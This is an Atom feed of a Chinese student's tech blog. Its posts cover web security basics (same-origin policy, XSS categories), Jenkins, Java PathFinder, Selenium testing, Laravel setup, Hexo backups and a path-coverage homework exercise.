账户的密码，才可以正常访问。</p><h4 id="设置-hexo-博客时出现的-npm-install-的问题"><a href="#设置-hexo-博客时出现的-npm-install-的问题" class="headerlink" title="设置 hexo 博客时出现的 npm install 的问题"></a>设置 hexo 博客时出现的 npm install 的问题</h4><p>由于 npm 安装时需要与外部建立软链，而 Windows 只有管理员才可以进行此操作，所以需要使用管理员模式打开命令行界面才可以</p><p>其余的遇到问题不断更新吧</p><p>反正我以后不用来回切换系统了啊哈哈哈哈</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不知道广大程序员们是怎么处理 Windows 和 Linux 的，最开始在 Windows 下面跑 Linux 的虚拟机，卡的自己怀疑人生。后来做了个双系统，自己 250 的固态表示根本不够用，而且动不动关机重启，别问我为什么，毕竟 office 割舍不了。后来一个学长点了
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="虚拟机" scheme="https://blog.liebes.top/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
      <category term="Vagrant" scheme="https://blog.liebes.top/tags/Vagrant/"/>
    
  </entry>
  
  <entry>
    <title>网络安全学习之浏览器安全</title>
    <link href="https://blog.liebes.top/2017/05/10/web-security-1/"/>
    <id>https://blog.liebes.top/2017/05/10/web-security-1/</id>
    <published>2017-05-10T14:32:43.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看《白帽子讲WEB安全》这本书，按着章节记录一下实践和学习的过程。</p><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><blockquote><p>简单来说，同源策略限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性</p></blockquote><p>同源的网站指起host地址是一致的</p><p>比如以下几个地址</p><ol><li><a href="http://store.company.com/dir2/index.html" target="_blank" rel="noopener">http://store.company.com/dir2/index.html</a></li><li><a href="http://store.company.com/dir1/index.html" target="_blank" rel="noopener">http://store.company.com/dir1/index.html</a></li><li><a href="https://store.company.com/dir1/index.html" target="_blank" rel="noopener">https://store.company.com/dir1/index.html</a></li><li><a href="http://store.company.com:8080/dir2/index.html" target="_blank" rel="noopener">http://store.company.com:8080/dir2/index.html</a></li><li><a href="http://news.company.com/dir1/index.html" target="_blank" rel="noopener">http://news.company.com/dir1/index.html</a></li></ol><p>其中1,2是同源的，而其他几个则不是。</p><p>对于一个网页中加载的javascript资源而言，其域是当前打开的页面</p><p>比如在a.com中引用了b.com中的文件</p><pre><code>&lt;script src=&quot;http://b.com/b.js&quot;&gt;&lt;/script&gt;</code></pre><p>其中b.js的源是a.com而非b.com</p><h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>跨站脚本攻击，全称是 Cross Site Script。XSS攻击通常指黑客通过“Html 注入”篡改了网页，插入恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射型XSS只是简单地把用户输入的数据“反射”给浏览器，也就是说，黑客需要诱使用户点击一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型CSS”（Non-persistent XSS）</p><h4 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h4><p>储存型XSS会把用户输入的数据“储存”在服务器端。这种XSS具有很强的稳定性。</p><h4 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h4><p>DOM Based XSS 从本质上来说也是反射型XSS。单独划分出来是因为DOM Based XSS的形成原因比较特别。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在看《白帽子讲WEB安全》这本书，按着章节记录一下实践和学习的过程。&lt;/p&gt;
&lt;h3 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;简单来说，
      
    
    </summary>
    
      <category term="安全" scheme="https://blog.liebes.top/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://blog.liebes.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://blog.liebes.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins 安装与使用</title>
    <link href="https://blog.liebes.top/2017/04/14/SoftwareManagement-HW-2/"/>
    <id>https://blog.liebes.top/2017/04/14/SoftwareManagement-HW-2/</id>
    <published>2017-04-14T15:55:26.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>Jenkins旨在编程的持续继承，测试部署自动化，官方给的简介如下：</p><blockquote><p>Jenkins is a self-contained, open source automation server which can be used to automate all sorts of tasks such as building, testing, and deploying software. Jenkins can be installed through native system packages, Docker, or even run standalone by any machine with the Java Runtime Environment installed.</p></blockquote><p>首先下载 Jenkins 的war包<br><a href="http://mirrors.jenkins.io/war-stable/latest/jenkins.war" target="_blank" rel="noopener">jenkins.war</a><br>运行命令</p><pre><code>$ java -jar jenkins.war</code></pre><p>该命令会在本地的8080端口运行jenkins<br>访问 <code>localhost:8080</code> 会看到jenkins 的欢迎界面，按照步骤依次进行设置。<br>在安装插件的界面，选择默认即可，jenkins会帮你安装一些常见的插件，比如git，pipeline等<br>设置结束后会看到如下界面<br><img src="/images/2017-4-24-14-7.png" alt="pictures"><br>点击左上角新建按钮，即可新建一个项目，这里我们选择新建一个maven项目。在github project选项上选择我们的github地址<br><img src="/images/2017-04-24-14-26.png" alt="pictures"><br>在源码管理设置上选择git，并设置默认编译的分支为主分支<br><img src="/images/2017-04-24-14-28.png" alt="pictures"><br>在构建触发器设置上，选择Poll SCM 并在日程表里面输入<code>* * * * *</code>表示每一分钟就会执行依次构建<br><img src="/images/2017-04-24-14-30.png" alt="pictures"><br>在构建的位置，选择新增一个shell 并输入<code>mvn test</code><br><img src="/images/2017-04-24-14-34.png" alt="pictures"><br>点击保存后即可<br>此后每一次将代码更新到github之后，jenkins会自动进行检测，同时在每次构建时会自动进行测试。在Consloe Output中可以看到测试结果<br><img src="/images/2017-04-24-14-42.png" alt="pictures"><br><img src="/images/2017-04-24-14-43.png" alt="pictures"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Jenkins旨在编程的持续继承，测试部署自动化，官方给的简介如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Jenkins is a self-contained, open source automation server which can be used to au
      
    
    </summary>
    
      <category term="作业" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="软件项目管理作业" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>【软件测试】JAVA PATH FINDER [JPF]</title>
    <link href="https://blog.liebes.top/2017/04/08/SoftwareTest-HW-4/"/>
    <id>https://blog.liebes.top/2017/04/08/SoftwareTest-HW-4/</id>
    <published>2017-04-08T15:07:09.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>软件测试小组作业之JPF</p><p>首先先说说JPF是个什么东西</p><p>官方给出的解释：</p><blockquote><p>JPF核心是用于Java™字节码的虚拟机（VM），这意味着它是一个程序，您可以让Java程序执行。它用于在这些程序中找到缺陷，因此您还需要给出属性以作为输入进行检查。 JPF通过一份报告来回复，该报告说如果属性持有和/或由JPF创建的验证工件进行进一步分析（如测试用例）。</p></blockquote><blockquote><p>JPF是一个有几个扭曲的虚拟机。它在Java本身中实现，所以不要指望它像您的普通Java一样快速运行。它是在VM上运行的VM。虽然Java字节码的执行语义在<a href="http://java.sun.com/docs/books/jvms/second_edition/html/VMSpecTOC.doc.html/" target="_blank" rel="noopener">http://java.sun.com/docs/books/jvms/second_edition/html/VMSpecTOC.doc.html/</a> Sun的Java虚拟机规范中有明确定义，但我们在JPF中几乎没有硬连线语义 - VM指令集由一组可被替换的类表示。</p></blockquote><blockquote><p>默认指令集使用下一个JPF功能：执行选项。 JPF可以识别您的程序中的执行可能不同的进程，然后系统地探索所有这些点。这意味着JPF（理论上）通过程序执行所有路径，而不仅仅是像普通的VM那样。典型的选择是不同的调度序列或随机值，但JPF可以再次介绍您自己的类型，如用户输入或statemachine事件。</p></blockquote><p>个人觉得JPF是一个针对JAVA程序寻找可执行路径的工具。看了一下官方的例子，觉得JPF可以在JAVA程序执行时自动检测所有的可执行路径，找到可能出现问题的路径。不同于传统的基于用例的Testing，JPF采用的是Model Checking，尽管基于用例的测试在用例足够多的时候有着很不错的测试效果，但是很难保证测试到所有的可行路径。JPF官方给出了基于测试用例的Testing 与 Model Testing 的差别：<a href="http://babelfish.arc.nasa.gov/trac/jpf/wiki/intro/testing_vs_model_checking" target="_blank" rel="noopener">testing_vs_model_checking</a></p><p>那么说说JPF安装的方式，JPF安装需要使用一个类似于git的管理工具：Mercurial，同时需要JUNIT，与Apache ant。<br>安装之前我们需要先下载Mercuial 和 ant</p><pre><code>$ sudo apt install mercurial$ sudo apt install ant</code></pre><p>由于我使用的IDE是 idea ,自带了JUNIT的包，没有的需要去下载一下。<br>需要将JUNIT包的目录加入到环境变量中</p><pre><code>$ sudo vi /etc/provileexport JUNIT_HOME=/home/hardy/app/idea-IU-163.13906.18/libexport CLASSPATH=.:$CLASSPATH:$JUNIT_HOME/junit-4.12.jar$ source /etc/provile</code></pre><p>使用Mercuial下载jpf-core的仓库</p><pre><code>$ hg clone http://babelfish.arc.nasa.gov/hg/jpf/jpf-core$ cd jpf-core$ ant test</code></pre><p>成功后会提示安装成功</p><pre><code>BUILD SUCCESSFULTotal time: 3 minutes 53 seconds</code></pre><p>新建一个JAVA类，测试jpf</p><pre><code class="java"># Racer.javapublic class Racer implements Runnable {    int d = 42;    public void run () {        doSomething(1000);                   // (1)        d = 0;                               // (2)    }    public static void main (String[] args){        Racer racer = new Racer();        Thread t = new Thread(racer);        t.start();        doSomething(1000);                   // (3)        int c = 420 / racer.d;               // (4)        System.out.println(c);    }    static void doSomething (int n) {        // not very interesting..        try { Thread.sleep(n); } catch (InterruptedException ix) {}    }}</code></pre><p>在同一目录下建立Racer.jpf，写入jpf的配置信息</p><pre><code># Racer.jpftarget = Racerlistener=gov.nasa.jpf.listener.PreciseRaceDetectorreport.console.property_violation=error,trace​</code></pre><p>上述配置能够输出jpf的工作栈<br>此程序正常的输出应为10<br>然而由于我们不知道线程的调度关系，因而忽略了可能导致的除0的问题</p><pre><code>$ ~/jpf-core/bin/jpf Racer.jpf# outputJavaPathfinder core system v8.0 (rev 32) - (C) 2005-2014 United States Government. All rights reserved.====================================================== system under testRacer.main()====================================================== search started: 17-4-10 下午4:211010====================================================== error 1gov.nasa.jpf.listener.PreciseRaceDetectorrace for field Racer@15b.d  main at Racer.main(Racer.java:35)        &quot;int c = 420 / racer.d;               // (4)&quot;  READ:  getfield Racer.d  Thread-1 at Racer.run(Racer.java:26)        &quot;d = 0;                               // (2)&quot;  WRITE: putfield Racer.d====================================================== trace #1------------------------------------------------------ transition #0 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;ROOT&quot; ,1/1,isCascaded:false}      [3157 insn w/o sources]  Racer.java:30                  : Racer racer = new Racer();  Racer.java:19                  : public class Racer implements Runnable {      [1 insn w/o sources]  Racer.java:21                  : int d = 42;  Racer.java:30                  : Racer racer = new Racer();  Racer.java:31                  : Thread t = new Thread(racer);      [145 insn w/o sources]  Racer.java:31                  : Thread t = new Thread(racer);  Racer.java:32                  : t.start();      [1 insn w/o sources]------------------------------------------------------ transition #1 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;START&quot; ,1/2,isCascaded:false}      [2 insn w/o sources]  Racer.java:34                  : doSomething(1000);                   // (3)  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}      [4 insn w/o sources]------------------------------------------------------ transition #2 thread: 1gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SLEEP&quot; ,2/2,isCascaded:false}      [1 insn w/o sources]  Racer.java:1                   : /*  Racer.java:25                  : doSomething(1001);                   // (1)  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}      [4 insn w/o sources]------------------------------------------------------ transition #3 thread: 1gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SLEEP&quot; ,2/2,isCascaded:false}      [3 insn w/o sources]  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}  Racer.java:42                  : }  Racer.java:26                  : d = 0;                               // (2)------------------------------------------------------ transition #4 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SHARED_OBJECT&quot; ,1/2,isCascaded:false}      [3 insn w/o sources]  Racer.java:41                  : try { Thread.sleep(n); } catch (InterruptedException ix) {}  Racer.java:42                  : }  Racer.java:35                  : int c = 420 / racer.d;               // (4)------------------------------------------------------ transition #5 thread: 0gov.nasa.jpf.vm.choice.ThreadChoiceFromSet {id:&quot;SHARED_OBJECT&quot; ,1/2,isCascaded:false}  Racer.java:35                  : int c = 420 / racer.d;               // (4)====================================================== resultserror #1: gov.nasa.jpf.listener.PreciseRaceDetector &quot;race for field Racer@15b.d   main at Racer.main(Ra...&quot;====================================================== statisticselapsed time:       00:00:00states:             new=9,visited=1,backtracked=4,end=2search:             maxDepth=6,constraints=0choice generators:  thread=8 (signal=0,lock=1,sharedRef=2,threadApi=3,reschedule=2), data=0heap:               new=362,released=33,maxLive=357,gcCycles=7instructions:       3424max memory:         119MBloaded code:        classes=62,methods=1477====================================================== search finished: 17-4-10 下午4:21</code></pre><p>可以看到jpf帮我们运行了所有可能的路径，同时找到了可能发生的错误<br>通过线程的角度来考虑，可以用官网给出的这个调度图来说明：<br><img src="/images/interleavings.png" alt="pictures"><br>对于一个多线程的java程序，jpf会组合出所有的可能的线程调度，并顺序遍历每一种执行顺序，知道找到可能存在的缺陷</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;软件测试小组作业之JPF&lt;/p&gt;
&lt;p&gt;首先先说说JPF是个什么东西&lt;/p&gt;
&lt;p&gt;官方给出的解释：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JPF核心是用于Java™字节码的虚拟机（VM），这意味着它是一个程序，您可以让Java程序执行。它用于在这些程序中找到缺陷，因此您
      
    
    </summary>
    
      <category term="作业" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="软件测试作业" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>【软件测试】Selenium Web 测试</title>
    <link href="https://blog.liebes.top/2017/03/26/SoftwareTest-LIB-2/"/>
    <id>https://blog.liebes.top/2017/03/26/SoftwareTest-LIB-2/</id>
    <published>2017-03-26T17:08:07.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>Selenium 用于WEB程序测试，可以录制下来点击过程的脚本，并自动进行测试。</p><ul><li><a href="#ide">使用selenium-ide 进行脚本录制</a></li><li><a href="#selenium-java">使用java编写selenium程序，实现自动验证</a></li></ul><hr><p></p><h2 id="ide">使用selenium-ide 进行脚本录制</h2><br>在开始实验之前，需要安装所需要的软件。首先想要使用selenium-ide，需要是用firefox浏览器。<br><a href="https://www.mozilla.org/zh-CN/firefox/new/" target="_blank" rel="noopener">firefox下载链接</a><br><a href="https://addons.mozilla.org/en-US/firefox/addon/selenium-ide/" target="_blank" rel="noopener">selenium-ide下载链接</a><br>将下载后的selenium插件拖到firefox里即可自动安装。<br>成功安装后，在firefox中可以打开selenium插件:<br>选择开发者工具中的selenium-ide<br><img src="/images/2017-3-26-21-22.png" alt="Pictures"><br>打开后长这个样子<br><img src="/images/2017-3-26-21-27.png" alt="Pictures"><br>在1的位置输入想要测试的网址，接着点击2位置的按钮开始录制。去浏览器访问对应的网站，完成表单提交操作，回到selenium-ide会看到录制下来的case，最后点击4,会将当前所有的case执行一遍。<p></p><hr><p></p><h2 id="selenium-java">使用java编写selenium程序，实现自动验证</h2><br>新建一个java项目，然后导入下列jar包<p></p><ul><li><a href="http://selenium-release.storage.googleapis.com/3.3/selenium-server-standalone-3.3.1.jar" target="_blank" rel="noopener">selenium-server-standalone-3.3.1.jar</a></li><li><a href="http://selenium-release.storage.googleapis.com/3.3/selenium-java-3.3.1.zip" target="_blank" rel="noopener">selenium-java-3.3.1.zip</a></li></ul><p>导入成功后需要下载firefox的驱动：<br><a href="https://github.com/mozilla/geckodriver/releases/download/v0.15.0/geckodriver-v0.15.0-linux64.tar.gz" target="_blank" rel="noopener">geckodriver-v0.15.0-linux64.tar.gz</a></p><p>以上就是全部的准备工作了<br>新建一个项目，在main方法中写如下代码:</p><pre><code class="java">import java.io.*;import java.util.concurrent.TimeUnit;import org.openqa.selenium.*;import org.openqa.selenium.firefox.FirefoxDriver;import com.csvreader.*;public class Main {    public static void main(String[] args){        //定义测试的根目录        String baseUrl = &quot;http://121.193.130.195:8080&quot;;        // 创建webdriver对象        System.setProperty(&quot;webdriver.gecko.driver&quot;, &quot;geckodriver&quot;);        WebDriver driver = new FirefoxDriver();        driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);        try{            //读取csv文件            File inFile = new File(&quot;inputgit.csv&quot;);            BufferedReader reader = new BufferedReader(new FileReader(inFile));            CsvReader csvreader = new CsvReader(reader,&#39;,&#39;);            //每次读取一行            while(csvreader.readRecord()){                String str = csvreader.getRawRecord();                String[] strList = str.split(&quot;,&quot;);                //使用webdriver模拟登录，并获取信息                driver.get(baseUrl + &quot;/&quot;);                driver.findElement(By.id(&quot;name&quot;)).clear();                driver.findElement(By.id(&quot;name&quot;)).sendKeys(strList[0]);                driver.findElement(By.id(&quot;pwd&quot;)).clear();                driver.findElement(By.id(&quot;pwd&quot;)).sendKeys(strList[0].substring(4));                driver.findElement(By.id(&quot;submit&quot;)).click();                String temp = strList[0];                strList[0] = strList[1];                strList[1] = temp;                //获取特定验证信息                String[] targetGitUrl = driver.findElement(By.id(&quot;resultString&quot;)).getAttribute(&quot;innerHTML&quot;).trim().split(&quot;,&quot;);                boolean flag = true;                for(int i = 0; i &lt; 3; i ++){                    if(!strList[i].equals(targetGitUrl[i])){                        flag = false;                        break;                    }                }                //验证失败                if(!flag){                    System.out.println(&quot;Error: \n&quot; + strList[0] + &quot; &quot; + strList[1] + &quot; &quot; + strList[2]);                    System.out.println(targetGitUrl[0] + &quot; &quot; + targetGitUrl[1] + &quot; &quot; + targetGitUrl[2]);                }            }            driver.quit();        } catch (IOException e){            e.printStackTrace();        }    }}</code></pre><p>运行即可<br>完整的项目在github上：<a href="https://github.com/wanghaichi/selenium-web-test" target="_blank" rel="noopener">selenium-web-test</a></p><hr><p>挽尊</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Selenium 用于WEB程序测试，可以录制下来点击过程的脚本，并自动进行测试。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ide&quot;&gt;使用selenium-ide 进行脚本录制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#selenium-java&quot;&gt;使用java编
      
    
    </summary>
    
      <category term="上机实验" scheme="https://blog.liebes.top/categories/%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="软件测试上机实验" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>laravel的学习日常-初识</title>
    <link href="https://blog.liebes.top/2017/03/20/laravel-learn-1/"/>
    <id>https://blog.liebes.top/2017/03/20/laravel-learn-1/</id>
    <published>2017-03-20T00:24:17.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>记录记录自己踩过的坑</p><hr><p>按照官方文档，乖乖的用composer进行安装：</p><pre><code>$ composer global require &quot;laravel/installer&quot;</code></pre><p>然后，就给我报了噼里啪啦一堆错误</p><pre><code>  [Composer\Downloader\TransportException]                                       The &quot;https://packagist.org/packages.json&quot; file could not be downloaded: fai    led to open stream: Connection timed out                                     </code></pre><p>EXM？我还啥也没干呢啊 = =。<br>然后吧，我就把这个错误扔到了google上，注意了注意了，划重点了！搜出来解决方案的没有一个可以用的！然后我发现只是单纯的被墙了而已。<br>WHAT THE FUCK !!!<br>解决办法也挺简单，把composer的源切成国内镜像就好了</p><pre><code>$ composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></pre><p>具体的可以参见 <a href="https://pkg.phpcomposer.com/" target="_blank" rel="noopener">Packagist / Composer 中国全量镜像</a> 这里。<br>接下来就可以愉快的使用laravel了</p><pre><code>$ composer global require &quot;laravel/installer&quot;</code></pre><p>使用laravel新建一个项目，然后就可以看到牛逼闪闪的lavavel的目录结构：</p><pre><code>$ laravel new myProject</code></pre><p><img src="/images/2017-3-20-15-16.png" alt="pictures"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录记录自己踩过的坑&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;按照官方文档，乖乖的用composer进行安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ composer global require &amp;quot;laravel/installer&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="laravel" scheme="https://blog.liebes.top/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>hexo 使用git备份hexo源文件</title>
    <link href="https://blog.liebes.top/2017/03/17/hexo-backup/"/>
    <id>https://blog.liebes.top/2017/03/17/hexo-backup/</id>
    <published>2017-03-17T15:29:17.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>这是个悲伤的故事，海痴的linux出了点毛病，然后就想着重装一遍。掐指一算，自家的代码在git上面都保存了，直接重装！<br>然后吧，hexo你大爷，你没事就不能把博客原文备份一下么？又不占你的空间！那么费劲么！<br>是的，海痴的博客都没了，别问我为什么还能看着，宝宝复制粘贴都快吐了，弄到凌晨两点多才恢复了。<br>这件事情告诉我们，没事闲的别重装系统。</p><hr><p>具体的思路就是在我们的博客仓库中新建一个分支，用来保存源码，master分支用来提交hexo自动生成的文件。以海痴的博客为例。打开wanghaichi.github.io工作目录，我们可以喜闻乐见的发现没有.git文件夹。那么接下来的事情就简单了<br>打开工作目录，执行以下操作</p><pre><code>$ git init$ vi .gitignore.DS_StoreThumbs.dbdb.json  *.log.deploy*/node_modules/.npmignorepublic/$ git branch -b hexo$ git add .$ git commit -m &quot;backup&quot;$ git remote add origin git@github.com:wanghaichi/wanghaichi.github.io.git$ git push origin hexo</code></pre><p>如果没设置ssh权限可能需要设置一下，然后去github仓库里面切换以下分支，你的可爱的博客就都在里面啦。<br>以后每次写完博客，先执行一遍</p><pre><code>$ git add .$ git commit -m &quot;backup&quot;$ git push origin hexo</code></pre><p>再发布，就不用担心自家博客丢失啦</p><hr><p>妈妈再也不用担心复制博客到零点啦</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是个悲伤的故事，海痴的linux出了点毛病，然后就想着重装一遍。掐指一算，自家的代码在git上面都保存了，直接重装！&lt;br&gt;然后吧，hexo你大爷，你没事就不能把博客原文备份一下么？又不占你的空间！那么费劲么！&lt;br&gt;是的，海痴的博客都没了，别问我为什么还能看着，宝宝复制
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="hexo" scheme="https://blog.liebes.top/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>【软件测试】作业3 测试之路径覆盖</title>
    <link href="https://blog.liebes.top/2017/03/15/SoftwareTest-HW-3/"/>
    <id>https://blog.liebes.top/2017/03/15/SoftwareTest-HW-3/</id>
    <published>2017-03-15T23:34:02.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>书上的练习题，要求设计相应的测试用例，写出主路径覆盖</p><ul><li><a href="#problem">Problem Description</a></li><li><a href="#answer">Answer</a><!--mo--></li></ul><hr><p></p><h2 id="problem">Problem Description</h2><p></p><pre><code>/*********************************** * Finds and prints n prime integers * Jeff Offutt, Spring 2003************************************/private static void printPrimes (int n){    int curPrime;        // Value currently considered for primeness    int numPrimes;        // Number of primes found so far.    boolean isPrime;    // Is curPrime prime?    int [] primes = new int [MAXPRIMES]; // The list of prime numbers.    // Initialize 2 into the list of primes.    primes[0] = 2;    numPrimes = 1;    curPrime = 2;    while(numPrimes &lt; n){        curPrime++;        //next number to consider ...        isPrime = true;        for(int i = 0; i &lt;= numPrime-1; i++){            if(isDivisible(primes[i], curPrime)){                isPrime = false;                break;            }        }        if(isPrime){            primes[numPrimes] = curPrime;            numPrimes++;        }    } // end while    //Print all the primes out.    for(int i = 0; i &lt;= numPrimes-1; i ++){        System.out.println(&quot;Prime: &quot;+ primes[i]);    }} // end printPrimes</code></pre><blockquote><p>a) Draw the control flow graph for the printPrimes() method.</p></blockquote><blockquote><p>b) Consider test cases t1 = (n = 3) and t2 = (n = 5). Although these tour the prime paths in printPrimes(), they do not necessarily find the same faults. Design a simple fault that t2 would be more likely to discover than t1 would.</p></blockquote><blockquote><p>c) For printPrimes(), find a test case such that the corresponding test path visits the edge that connects the beginning of the while statement to the for statement without going through the body of the while loop.</p></blockquote><blockquote><p>d) Enumerate the test requirements for node coverage, edge coverage, and prime path coverage for the graph for printPrimes().</p></blockquote><hr><p></p><h2 id="answer">Answer</h2><p></p><h5 id="a-Draw-the-control-flow-graph-for-the-printPrimes-method"><a href="#a-Draw-the-control-flow-graph-for-the-printPrimes-method" class="headerlink" title="a) Draw the control flow graph for the printPrimes() method."></a>a) Draw the control flow graph for the printPrimes() method.</h5><p><img src="/images/2017-3-14-23-28.png" alt="pictures"></p><h5 id="b-Consider-test-cases-t1-n-3-and-t2-n-5-Although-these-tour-the-prime-paths-in-printPrimes-they-do-not-necessarily-find-the-same-faults-Design-a-simple-fault-that-t2-would-be-more-likely-to-discover-than-t1-would"><a href="#b-Consider-test-cases-t1-n-3-and-t2-n-5-Although-these-tour-the-prime-paths-in-printPrimes-they-do-not-necessarily-find-the-same-faults-Design-a-simple-fault-that-t2-would-be-more-likely-to-discover-than-t1-would" class="headerlink" title="b) Consider test cases t1 = (n = 3) and t2 = (n = 5). Although these tour the prime paths in printPrimes(), they do not necessarily find the same faults. Design a simple fault that t2 would be more likely to discover than t1 would."></a>b) Consider test cases t1 = (n = 3) and t2 = (n = 5). Although these tour the prime paths in printPrimes(), they do not necessarily find the same faults. Design a simple fault that t2 would be more likely to discover than t1 would.</h5><blockquote><p>If constant variable <code>MAXPRIMES</code> equals 4,it will occur a fault when n equals 5 but will not if n equals 3.</p></blockquote><h5 id="c-For-printPrimes-find-a-test-case-such-that-the-corresponding-test-path-visits-the-edge-that-connects-the-beginning-of-the-while-statement-to-the-for-statement-without-going-through-the-body-of-the-while-loop"><a href="#c-For-printPrimes-find-a-test-case-such-that-the-corresponding-test-path-visits-the-edge-that-connects-the-beginning-of-the-while-statement-to-the-for-statement-without-going-through-the-body-of-the-while-loop" class="headerlink" title="c) For printPrimes(), find a test case such that the corresponding test path visits the edge that connects the beginning of the while statement to the for statement without going through the body of the while loop."></a>c) For printPrimes(), find a test case such that the corresponding test path visits the edge that connects the beginning of the while statement to the for statement without going through the body of the while loop.</h5><blockquote><p>Let n = 1, and it will break the while loop in the first iteration.</p></blockquote><h5 id="d-Enumerate-the-test-requirements-for-node-coverage-edge-coverage-and-prime-path-coverage-for-the-graph-for-printPrimes"><a href="#d-Enumerate-the-test-requirements-for-node-coverage-edge-coverage-and-prime-path-coverage-for-the-graph-for-printPrimes" class="headerlink" title="d) Enumerate the test requirements for node coverage, edge coverage, and prime path coverage for the graph for printPrimes()."></a>d) Enumerate the test requirements for node coverage, edge coverage, and prime path coverage for the graph for printPrimes().</h5><p>node coverage</p><blockquote><p>{1,2,3,4,5,6,7,8,9,10,11,12,13,14}</p></blockquote><p>edge coverage</p><blockquote><p>{(1,2), (2,3), (2,10), (3,4), (4,5), (5,6), (5,8), (6,5), (6,7), (7,8), (8,2), (9,2), (10,11), (11,12), (11,14), (12,13), (13,11)}</p></blockquote><p>prime path 